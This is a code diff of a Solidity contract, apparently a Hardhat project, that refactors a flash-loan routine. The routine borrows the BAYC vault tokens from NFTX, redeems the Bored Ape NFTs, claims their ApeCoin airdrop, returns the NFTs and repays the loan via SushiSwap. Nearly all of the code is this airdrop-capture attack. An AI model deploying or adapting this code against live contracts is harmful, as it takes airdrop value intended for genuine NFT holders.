@@ -59,7 +59,6 @@ contract ApeMev is Ownable, IERC3156FlashBorrowerUpgradeable, IERC721Receiver {
         console.log("Requesting flash loan");
         // flashloan fee is 0 so we can request maximum amount
         uint256 maxFlashLoan = NFTX_Vault.maxFlashLoan(BAYC_NTFX_ERC20_ADDRESS);
-        console.log("max", maxFlashLoan);
         NFTX_Vault.flashLoan(this, BAYC_NTFX_ERC20_ADDRESS, maxFlashLoan, "");
     }
 
@@ -77,24 +76,28 @@ contract ApeMev is Ownable, IERC3156FlashBorrowerUpgradeable, IERC721Receiver {
         console.log("Received flash loan");
         loanAmount = amount;
 
-        SwapForApe();
+        executeMEV();
         repayLoan();
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     }
 
+    function executeMEV() internal {
+        SwapForApe();
+        claimTokens();
+        returnApes();
+    }
+
     function SwapForApe() internal {
         console.log("Swapping bayc tokens for nfts");
 
         uint256 amount = NFTX_Vault.totalHoldings();
-        console.log("Amount in Vault holdings", amount);
         uint256[] memory specifiedIds = new uint256[](0);
 
         BAYC_VAULT_TOKEN.approve(address(NFTX_Vault), type(uint256).max);
         NFTX_Vault.redeem(amount, specifiedIds);
 
-        claimTokens();
     }
 
     function onERC721Received(
@@ -115,52 +118,34 @@ contract ApeMev is Ownable, IERC3156FlashBorrowerUpgradeable, IERC721Receiver {
 
     function claimTokens() internal {
         console.log("Claiming airdrop");
-        uint256 amount = AIRDROP.getClaimableTokenAmount(address(this));
-        console.log("claimable amount: ", amount);
         AIRDROP.claimTokens();
-        console.log("finished claming airdrop");
         uint256 apeCoinBalance = IERC20(APECOIN).balanceOf(address(this));
-        console.log("My Balance of APECOIN", apeCoinBalance);
 
-        returnApes();
     }
 
     function returnApes() internal {
-        console.log("Returning Apes NFTs to NFTX and minting vault token");
+        console.log("Returning Apes NFTs to NFTX and mint vault token");
         IERC721(BAYC_ERC721_ADDRESS).setApprovalForAll(BAYC_NTFX_ERC20_ADDRESS, true);
         uint256[] memory amounts = new uint256[](0);
         uint256 before = BAYC_VAULT_TOKEN.balanceOf(address(this));
 
         NFTX_Vault.mint(nftTokenIds, amounts);
-        console.log("BAYC AMOUnt gained", BAYC_VAULT_TOKEN.balanceOf(address(this)) - before);
     }
 
     function repayLoan() internal {
         console.log("Repaying flashloan");
 
+        // We must make sure we have exact or greater amount of bayc vault tokens
+        // as amount we have flash borrowed. We will swap WETH for tokens using SushiSwap
+
         uint256 currentBalance = BAYC_VAULT_TOKEN.balanceOf(address(this));
-
-        console.log(currentBalance);
-        console.log(loanAmount);
-        console.log(loanAmount - currentBalance);
-
-        address pairAddr = SUSHI_FACTORY.getPair(BAYC_NTFX_ERC20_ADDRESS, WETH);
-        require(pairAddr != address(0), "!pair");
-
-        IUniswapV2Pair pair = IUniswapV2Pair(pairAddr);
-        (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = pair.getReserves();
-        console.log("reserves", reserve0, reserve1);
-
         uint256 amountToGet = loanAmount - currentBalance;
-        console.log("Amount to get", amountToGet);
         address[] memory path = new address[](2);
         path[0] = WETH;
         path[1] = BAYC_NTFX_ERC20_ADDRESS;
         IERC20(WETH).approve(address(SUSHI_ROUTER), type(uint256).max);
         IWETH(WETH).deposit{value: 200 ether}();
-        console.log("Finished approving");
         SUSHI_ROUTER.swapTokensForExactTokens(amountToGet, type(uint256).max, path, address(this), type(uint256).max);
-        console.log("Finished swap");
 
         // flashloan will automatically get paid back
     }
